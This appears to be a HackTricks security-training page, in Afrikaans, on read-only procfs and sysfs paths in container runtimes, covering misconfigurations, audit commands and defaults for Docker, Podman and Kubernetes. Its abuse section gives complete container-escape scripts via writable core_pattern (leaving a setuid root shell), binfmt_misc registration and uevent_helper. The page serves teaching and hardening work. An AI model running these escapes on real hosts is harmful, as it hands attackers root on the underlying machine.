# Leesalleen-stelselpaadjies

{{#include ../../../../banners/hacktricks-training.md}}

Leesalleen-stelselpaadjies is ’n afsonderlike beskerming teenoor gemaskerde paadjies. In plaas daarvan om ’n paadjie heeltemal te versteek, stel die runtime dit bloot, maar mount dit as leesalleen. Dit is algemeen vir geselekteerde procfs- en sysfs-liggings waar leestoegang aanvaarbaar of operasioneel noodsaaklik kan wees, maar waar skryfwerk te gevaarlik sou wees.

Die doel is eenvoudig: baie kernel-koppelvlakke word aansienlik gevaarliker wanneer dit skryfbaar is. ’n Leesalleen-mount verwyder nie alle reconnaissance-waarde nie, maar dit voorkom dat ’n gekompromitteerde workload die onderliggende kernel-gerigte lêers deur daardie paadjie wysig.

## Werking

Runtimes merk dikwels dele van die proc/sys-aansig as leesalleen. Afhangend van die runtime en host, kan dit paadjies soos die volgende insluit:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Die werklike lys verskil, maar die model bly dieselfde: laat sigbaarheid toe waar nodig, en weier mutasie by verstek.

## Laboratorium

Inspekteer die Docker-gedefinieerde lys van leesalleen-paadjies:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspekteer die gemonteerde proc/sys-aansig van binne die container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Sekuriteitsimpak

Leesalleen-stelselpaths beperk ’n groot klas misbruik wat ’n impak op die host kan hê. Selfs wanneer ’n aanvaller procfs of sysfs kan inspekteer, verwyder die onvermoë om daarheen te skryf baie direkte wysigingspaaie wat kernel-tunables, crash handlers, module-loading helpers of ander beheerinterfaces betrek. Die blootstelling is nie weg nie, maar die oorgang van inligtingsopenbaarmaking na invloed op die host word moeiliker.

## Verkeerde konfigurasies

Die belangrikste foute is om sensitiewe paths te unmask of weer as read-write te mount, host proc/sys-inhoud direk met writable bind mounts bloot te stel, of privileged modes te gebruik wat die veiliger runtime-verstekwaardes in die praktyk omseil. In Kubernetes gaan `procMount: Unmasked` en privileged workloads dikwels saam met swakker proc-beskerming. Nog ’n algemene operasionele fout is om aan te neem dat omdat die runtime hierdie paths gewoonlik as read-only mount, alle workloads steeds daardie verstekwaarde oorerf.

## Misbruik

As die beskerming swak is, begin deur te kyk vir writable proc/sys-inskrywings:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wanneer skryfbare inskrywings teenwoordig is, sluit waardevolle opvolgpaaie in:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Wat hierdie commands kan onthul:

- Skryfbare inskrywings onder `/proc/sys` beteken dikwels dat die container host-kernelgedrag kan wysig, eerder as om dit slegs te inspekteer.
- `core_pattern` is besonder belangrik, omdat ’n skryfbare host-gerigte waarde in ’n host code-execution-pad omskep kan word deur ’n proses te laat crash nadat ’n pipe handler gestel is.
- `modprobe` onthul die helper wat deur die kernel vir module-loading-verwante vloeie gebruik word; dit is ’n klassieke hoëwaarde-teiken wanneer dit skryfbaar is.
- `binfmt_misc` wys of custom interpreter-registrasie moontlik is. Indien registrasie skryfbaar is, kan dit ’n execution primitive word in plaas van slegs ’n information leak.
- `panic_on_oom` beheer ’n hostwye kernel-besluit en kan resource exhaustion dus in host denial of service omskep.
- `uevent_helper` is een van die duidelikste voorbeelde van ’n skryfbare sysfs-helperpad wat host-context execution veroorsaak.

Interessante bevindings sluit skryfbare host-gerigte proc-knobs of sysfs-inskrywings in wat normaalweg read-only behoort te wees. Op daardie stadium het die workload van ’n beperkte container-aansig na betekenisvolle kernel-invloed beweeg.

### Volledige voorbeeld: `core_pattern` Host Escape

Indien `/proc/sys/kernel/core_pattern` vanuit die container skryfbaar is en na die host-kernel-aansig wys, kan dit misbruik word om ’n payload ná ’n crash uit te voer:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
As die pad werklik die host-kernel bereik, loop die payload op die host en laat dit ’n setuid shell agter.

### Volledige voorbeeld: `binfmt_misc`-registrasie

As `/proc/sys/fs/binfmt_misc/register` skryfbaar is, kan ’n custom interpreter registration code execution veroorsaak wanneer die ooreenstemmende lêer uitgevoer word:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Op ’n host-gerigte skryfbare `binfmt_misc` is die resultaat kode-uitvoering in die kern-geaktiveerde interpreter-pad.

### Volledige voorbeeld: `uevent_helper`

As `/sys/kernel/uevent_helper` skryfbaar is, kan die kernel ’n helper op ’n host-pad aanroep wanneer ’n ooreenstemmende gebeurtenis geaktiveer word:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Die rede waarom dit so gevaarlik is, is dat die helper path vanuit die host filesystem-perspektief opgelos word eerder as vanuit ’n veilige, slegs-container-konteks.

## Kontroles

Hierdie kontroles bepaal of procfs/sysfs-blootstelling read-only is waar dit verwag word, en of die workload steeds sensitiewe kernel interfaces kan wysig.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Wat is hier interessant:

- ’n Normaal geharde workload behoort baie min skryfbare proc/sys-inskrywings bloot te stel.
- Skryfbare `/proc/sys`-paaie is dikwels belangriker as gewone leestoegang.
- As die runtime aandui dat ’n pad leesalleen is, maar dit in die praktyk skryfbaar is, hersien mount propagation, bind mounts en privilege-instellings noukeurig.

## Runtime-standaardwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | By verstek geaktiveer | Docker definieer ’n versteklys van leesalleen-paaie vir sensitiewe proc-inskrywings | blootstelling van host proc/sys mounts, `--privileged` |
| Podman | By verstek geaktiveer | Podman pas verstek-alleenlees-paaie toe tensy dit uitdruklik verslap word | `--security-opt unmask=ALL`, breë host mounts, `--privileged` |
| Kubernetes | Erft runtime-verstekwaardes | Gebruik die onderliggende runtime se leesalleen-padmodel tensy dit deur Pod-instellings of host mounts verswak word | `procMount: Unmasked`, bevoorregte workloads, skryfbare host proc/sys mounts |
| containerd / CRI-O onder Kubernetes | Runtime-verstekwaarde | Vertrou gewoonlik op OCI/runtime-verstekwaardes | dieselfde as die Kubernetes-ry; direkte runtime-konfigurasieveranderinge kan die gedrag verswak |

Die kernpunt is dat leesalleen-stelselpaaie gewoonlik as ’n runtime-verstekwaarde teenwoordig is, maar maklik ondermyn kan word deur bevoorregte modusse of host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
